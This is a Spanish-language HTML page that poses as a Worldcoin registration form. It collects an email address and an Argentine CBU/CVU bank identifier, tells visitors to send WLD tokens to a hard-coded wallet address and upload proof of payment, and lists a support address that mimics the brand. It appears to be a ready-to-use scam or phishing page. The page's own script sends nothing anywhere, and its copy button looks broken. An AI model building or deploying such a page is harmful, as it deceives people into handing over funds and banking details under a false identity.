<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro - Worldcoin</title>
    <style>
        body {
    font-family: Arial, sans-serif;
    background-color: #f5f5f5;
    color: #333;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.container {
    background-color: white;
    padding: 40px;
    border-radius: 10px;
    box-shadow: 0px 0px 20px 0px rgba(0, 0, 0, 0.1);
    text-align: center;
    width: 300px; /* Ancho del contenedor */
}

.input-group {
    margin-bottom: 20px;
}

.input-group label {
    font-size: 18px;
    margin-bottom: 10px;
    display: block;
}

.input-group input[type="text"] {
    width: calc(100% - 30px);
    padding: 10px;
    font-size: 16px;
    border: 1px solid #ccc;
    border-radius: 5px;
}

.input-group button {
    width: 100px; /* Ancho del botón */
    padding: 10px; /* Padding del botón */
    font-size: 14px; /* Tamaño del texto del botón */
    background-color: #4CAF50;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
}

.input-group button:hover {
    background-color: #45a049;
}

.success-text {
    color: green;
    font-size: 16px;
    margin-top: 10px;
}

.support-text {
    font-size: 14px;
    text-align: center;
    margin-top: 20px;
}

    </style>
</head>

<body>
 <div class="container">
    <h2>Registro - Worldcoin</h2>

    <div class="input-group">
        <label for="email">Ingresa tu correo:</label>
        <input type="text" id="email" placeholder="Correo electrónico">
        <button onclick="registrarCorreo(this)">Registrar y Enviar</button>
        <div class="success-text" id="email-success"></div>
    </div>

    <div class="input-group">
        <label for="cbu">Coloca tu CBU/CVU:</label>
        <input type="text" id="cbu" placeholder="CBU/CVU">
        <button onclick="registrarCBU(this)">Registrar y Enviar</button>
        <div class="success-text" id="cbu-success"></div>
    </div>

      <div class="card">
    <div class="card-body" style="background-color: #e1f5fe; padding: 20px; border-radius: 10px;">
        <div class="input-group mb-3">
            <label class="form-label" style="font-size: 24px; font-family: 'Arial', sans-serif;">Copia y envía los WLD a esta dirección:</label>
            <div class="input-group">
                <input type="text" class="form-control" id="wallet-address" value="0x772c9ffc982ef49b8b3fe750ee8e15010b4857c3" readonly>
                <button class="btn btn-sm btn-primary" onclick="copiarDireccion()">Copiar</button>
            </div>
        </div>

            <div class="mb-3">
                <label for="comprobante" class="form-label">Sube el comprobante del envío de Worldcoin:</label>
                <input type="file" class="form-control" id="comprobante">
            </div>
        </div>
    </div>

    <div class="support-text">
        <p>Soporte: <a href="mailto:WorldcoinAPP@Worldcoin.org">WorldcoinAPP@Worldcoin.org</a></p>
    </div>
</div>


    <script>
    function validarCorreo(correo) {
    return correo.includes('@');
}

function registrarCorreo(button) {
    var emailInput = document.getElementById('email');
    var successDiv = document.getElementById('email-success');

    if (validarCorreo(emailInput.value)) {
        emailInput.setAttribute('readonly', true);
        emailInput.style.backgroundColor = '#f2f2f2';
        successDiv.textContent = 'Registrado exitosamente!';

        // Cambiar el texto del botón a "CONFIRMADO"
        button.textContent = 'CONFIRMADO';
    } else {
        successDiv.textContent = 'Error: Correo inválido';
        successDiv.style.color = 'red';
    }
}

function registrarCBU(button) {
    var cbuInput = document.getElementById('cbu');
    var successDiv = document.getElementById('cbu-success');

    if (cbuInput.value.length > 0) {
        cbuInput.setAttribute('readonly', true);
        cbuInput.style.backgroundColor = '#f2f2f2';
        successDiv.textContent = 'El CBU ha sido registrado exitosamente.';

        // Cambiar el texto del botón a "CONFIRMADO"
        button.textContent = 'CONFIRMADO';
    } else {
        successDiv.textContent = 'Error: CBU/CVU inválido';
        successDiv.style.color = 'red';
    }
}

function copiarDireccion() {
    var direccion = document.getElementById('wallet-address');
    var texto = direccion.innerText || direccion.textContent;

    if (navigator.clipboard) {
        navigator.clipboard.writeText(texto)
            .then(function() {
                // Copia exitosa
                alert('Dirección copiada: ' + texto);
            })
            .catch(function(err) {
                // Manejar errores
                console.error('Error al copiar: ', err);
            });
    } else {
        // Si el navegador no es compatible con el API de Clipboard, usa el enfoque anterior
        var seleccion = document.createRange();
        seleccion.selectNodeContents(direccion);
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(seleccion);
        document.execCommand('copy');
        window.getSelection().removeAllRanges();

        // Puedes mostrar un mensaje de éxito
        alert('Dirección copiada: ' + texto);
    }
}


    </script>
</body>

</html>
